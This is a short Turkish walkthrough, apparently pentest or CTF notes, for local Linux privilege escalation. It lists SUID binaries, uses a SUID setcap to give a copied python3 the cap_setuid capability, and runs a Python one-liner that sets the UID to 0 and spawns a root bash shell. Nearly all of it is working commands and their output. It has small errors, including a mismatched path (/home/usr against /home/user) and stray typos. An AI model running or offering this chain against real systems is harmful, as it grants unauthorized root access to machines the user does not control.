Dosyayı geçerli kullanıcıdan daha yüksek bir ayrıcalık seviyesiyle çalıştırmamızı sağlayan SUID bitine sahip dosyaları bulun.
``` bash
find / -perm -u=s -type f 2>/dev/null
```
çıktı:
```
/sbin/setcap // setcap bulundu bu pv
/bin/mount
/bin/ping
```


Yetenekler kullanılarak istismar edilebilecek, seçtiğiniz ana dizininize bir ikili kopyalayın. Python'un bunu yaptığını biliyorum ve ben de yaptım

``` bash
cp /usr/bin/python3 /home/user/
```

daha sonra:
``` bash
setcap cap_setuid+ep /home/user/python3
```
daha sonra capabilitse bakıyoruz
``` bash
getcap -r / 2>/dev/null
```
Bunu görmemiz lazım çıktı:
```
/home/usr/python3  = cap_setuid+ep
```
```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
``` 



